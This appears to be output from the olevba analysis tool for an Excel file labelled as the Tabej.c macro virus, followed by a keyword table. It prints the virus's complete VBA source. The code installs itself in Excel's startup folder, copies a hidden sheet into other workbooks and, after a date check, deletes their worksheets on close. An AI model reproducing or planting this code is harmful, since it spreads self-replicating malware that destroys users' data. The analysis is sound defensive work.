olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tabej.c-8797d3e125bf2eee031ddd89e9479be6c31d99cc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO tabej.bas 
in file: Virus.MSExcel.Tabej.c-8797d3e125bf2eee031ddd89e9479be6c31d99cc - OLE stream: '_VBA_PROJECT_CUR/VBA/tabej'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' Macro1 Macro
' Macro recorded 18 06 1998 by NIKE
'
'
Sub auto_open()
Attribute auto_open.VB_Description = "Macro recorded 18 06 1998 by NIKE"
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n0"
    Application.OnSheetActivate = ""
    If Windows(1).Caption = "tabej.xls" Then Workbooks.Add
    s$ = Application.StartupPath & "\" & "tabej.xls"
    d$ = Dir(s$)
    If Not d$ = "tabej.xls" Then rx
    Application.OnSheetActivate = "inf"
End Sub
Sub rx()
Attribute rx.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    cd$ = CurDir()
    ChDir Application.StartupPath
    ActiveWorkbook.SaveAs filename:=Application.StartupPath & "/" & "tabej.xls"
    ActiveWindow.Visible = False
    ChDir cd$
    Application.ScreenUpdating = True
End Sub
Sub inf()
Attribute inf.VB_ProcData.VB_Invoke_Func = " \n14"
    dt = CSng(Date)
    For x = 1 To ActiveWorkbook.Sheets.Count
    If ActiveWorkbook.Sheets(x).Name = "tabej" Then
    If ActiveWorkbook.Name <> ThisWorkbook.Name Then
    If dt > 36016 Then
    Application.DisplayAlerts = False
    ActiveWorkbook.Sheets("tabej").Delete
    Exit Sub
    Application.DisplayAlerts = False
    ActiveWorkbook.Sheets("tabej").Delete
    Exit Sub
    Application.DisplayAlerts = True
    End If
    End If
    Exit Sub
    End If
    Next
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("tabej").Copy before:=ActiveWorkbook.Sheets(1)
    ActiveWorkbook.Sheets("tabej").Visible = False
    Application.ScreenUpdating = True
End Sub
Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
    dt = CSng(Date)
    If Not ActiveWorkbook Is Nothing Then
    If dt > 36015 Then
    If Worksheets.Count > 0 Then
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    Worksheets.Add.Move after:=Worksheets(Worksheets.Count)
    For x = 1 To Worksheets.Count - 1
    Worksheets(1).Delete
    Next
    ThisWorkbook.Save
    End If
    End If
    End If
    Application.DisplayAlerts = True
    If ThisWorkbook.Name = "tabej" Then Application.OnSheetActivate = ""
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  tabe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

